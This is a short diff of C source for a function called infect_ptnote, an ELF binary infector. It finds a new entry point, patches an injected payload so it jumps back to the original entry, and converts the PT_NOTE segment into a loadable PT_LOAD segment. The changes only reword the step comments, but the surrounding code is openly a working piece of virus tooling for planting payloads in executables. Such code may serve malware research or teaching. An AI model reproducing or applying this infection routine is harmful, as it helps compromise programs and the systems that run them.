@@ -140,12 +140,11 @@ int infect_ptnote(char *target_filename, unsigned char *payload, size_t payload_
         goto Error;
     }
 
-    // 2. Change the entry point address to an area that will not conflict with the
-    //    original program execution.
+    // 2. Find an address to an area that will not conflict with the original program execution.
     Elf64_Addr new_entry = calc_new_entry_point(map);
     off_t payload_offset = (st->st_size + 0xFFF) & ~0xFFF;
 
-    // 3. Patch payload
+    // 3. Patch the end of the code with instructions to jump to the original entry point
     if (patch_payload(map, new_entry, payload, payload_size) != 0) {
         LOG_DEBUG("patch_payload failed.");
         ret = 1;
@@ -159,7 +158,7 @@ int infect_ptnote(char *target_filename, unsigned char *payload, size_t payload_
         goto Error;
     }
 
-    // 5. Convert PT_NOTE to PT_LOAD
+    // 5. Convert the PT_NOTE segment to a PT_LOAD segment
     if (ptnote_to_ptload(map, payload_size, new_entry, payload_offset) != 0) {
         LOG_DEBUG("infect_ptnote failed.");
         ret = 1;
